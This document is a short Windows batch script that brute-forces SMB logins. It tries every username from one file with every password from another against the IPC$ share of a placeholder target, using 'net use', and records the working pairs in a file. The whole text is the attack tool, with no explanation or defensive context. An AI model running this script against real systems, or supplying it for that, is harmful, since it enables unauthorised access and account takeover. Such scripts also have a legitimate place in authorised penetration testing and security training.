@echo off
for /f %%u in (users.txt) do (
  for /f %%p in (passwords.txt) do (
    net use \\TARGET_IP\IPC$ /USER:%%u %%p 2>nul
    if not errorlevel 1 echo Valid: %%u:%%p >> success.txt
  )
)